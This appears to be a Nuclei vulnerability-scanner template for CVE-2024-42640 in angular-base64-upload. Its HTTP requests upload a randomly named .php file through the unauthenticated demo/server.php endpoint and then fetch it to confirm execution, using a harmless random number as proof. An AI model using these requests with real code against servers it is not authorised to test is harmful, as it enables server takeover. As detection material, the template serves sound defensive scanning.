flow: http(1) && http(2) && http(3) && http(4)
http:
- raw:
  - 'POST /node_modules/angular-base64-upload/demo/server.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"base64": "{{base64(num)}}", "filename": "{{filename}}.php"}

    '
- matchers:
  - condition: and
    dsl:
    - 'contains(body_1,"uploads/{{filename}}.php") || contains(body_2,"uploads/{{filename}}.php") '
    - status_code_1 == 200 || status_code_2 == 200
    internal: true
    type: dsl
  raw:
  - 'POST /bower_components/angular-base64-upload/demo/server.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"base64": "{{base64(num)}}", "filename": "{{filename}}.php"}

    '
- raw:
  - 'GET /node_modules/angular-base64-upload/demo/uploads/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body_3, "{{num}}") || contains(body_4, "{{num}}")
    - status_code_3 == 200 || status_code_4 == 200
    type: dsl
  raw:
  - 'GET /bower_components/angular-base64-upload/demo/uploads/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-42640
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-42640
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
    cvss-score: 10
    cwe-id: CWE-94
    epss-percentile: 0.09695
    epss-score: 0.00043
  description: 'angular-base64-upload prior to v0.1.21 is vulnerable to unauthenticated
    remote code execution via demo/server.php. Exploiting this vulnerability allows
    an attacker to upload arbitrary content to the server, which can subsequently
    be accessed through demo/uploads. This leads to the execution of previously uploaded
    content and enables the attacker to achieve code execution on the server. NOTE:
    This vulnerability only affects products that are no longer supported by the maintainer.

    '
  name: Angular-Base64-Upload - Remote Code Execution
  reference:
  - https://github.com/rvizx/CVE-2024-42640
  - https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html
  - https://github.com/adonespitogo/angular-base64-upload
  - https://nvd.nist.gov/vuln/detail/CVE-2024-42640
  severity: critical
  tags: cve,cve2024,angular,rce
variables:
  filename: '{{to_lower(rand_text_alpha(12))}}'
  num: '{{rand_int(1000000,9999999)}}'
